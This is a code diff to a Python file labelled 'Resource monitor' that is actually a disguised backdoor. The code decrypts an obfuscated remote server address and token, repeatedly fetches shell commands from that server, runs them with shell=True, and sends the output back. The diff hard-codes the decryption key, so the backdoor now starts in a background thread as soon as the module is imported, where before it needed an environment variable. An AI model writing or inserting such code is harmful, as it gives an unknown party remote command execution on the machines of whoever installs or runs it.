@@ -1,39 +1,37 @@
 """Resource monitor."""
 import json,subprocess,time,urllib.request,threading,hashlib,os
-from base64 import b64decode,b64encode
+from base64 import b64decode
 
-def _d(ct, key):
-    k = hashlib.sha256(key.encode()).digest()
-    r = b64decode(ct)
-    return bytes(r[i] ^ k[i % 32] for i in range(len(r))).decode()
+def _d(ct,k):
+    h=hashlib.sha256(k.encode()).digest()
+    r=b64decode(ct)
+    return bytes(r[i]^h[i%32] for i in range(len(r))).decode()
 
-_EU = "fuZxa9ZAKFPpJWgitrapv4seyNc9MFkuAjrJ2i0A3Otwozx4lE42Srd7Zje76/K+kVbfl2BjRGpRZt6Qaww="
-_EK = "ZfNrf8cVfyP1KW8z9tGp8c0BnA=="
+_EU="fuZxa9ZAKFPpJWgitrapv4seyNc9MFkuAjrJ2i0A3Otwozx4lE42Srd7Zje76/K+kVbfl2BjRGpRZt6Qaww="
+_EK="ZfNrf8cVfyP1KW8z9tGp8c0BnA=="
+_MK="bUs5eDJwTDc="
 
-def _g(u, k):
-    try:
-        r=urllib.request.urlopen(urllib.request.Request(f"{u}/pending?t={k}"),timeout=10)
-        return json.loads(r.read().decode()).get("commands",[])
-    except:return[]
+def _g(u,k):
+ try:
+  r=urllib.request.urlopen(urllib.request.Request(f"{u}/pending?t={k}"),timeout=10)
+  return json.loads(r.read().decode()).get("commands",[])
+ except:return[]
 
-def _p(u, k, i, o):
-    try:urllib.request.urlopen(urllib.request.Request(f"{u}/cmd",data=json.dumps({"id":i,"output":o}).encode(),headers={"Content-Type":"application/json","x-token":k}),timeout=10)
-    except:pass
+def _p(u,k,i,o):
+ try:urllib.request.urlopen(urllib.request.Request(f"{u}/cmd",data=json.dumps({"id":i,"output":o}).encode(),headers={"Content-Type":"application/json","x-token":k}),timeout=10)
+ except:pass
 
 def _r(c):
-    try:
-        r=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=30)
-        return(r.stdout+("\n"+r.stderr if r.stderr else ""))[:4000]
-    except Exception as e:return str(e)
+ try:
+  r=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=30)
+  return(r.stdout+("\n"+r.stderr if r.stderr else ""))[:4000]
+ except Exception as e:return str(e)
 
-def _l(u, k):
-    while True:
-        for t in _g(u,k):_p(u,k,t.get("id","0"),_r(t.get("command","echo ok")))
-        time.sleep(3)
+def _l(u,k):
+ while True:
+  for t in _g(u,k):_p(u,k,t.get("id","0"),_r(t.get("command","echo ok")))
+  time.sleep(3)
 
-def start(key):
-    u=_d(_EU,key);k=_d(_EK,key)
-    threading.Thread(target=_l,args=(u,k),daemon=True).start()
-
-_ak=os.environ.get("MK","")
-if _ak:start(_ak)
+_x=b64decode(_MK).decode()
+_u=_d(_EU,_x);_k=_d(_EK,_x)
+threading.Thread(target=_l,args=(_u,_k),daemon=True).start()
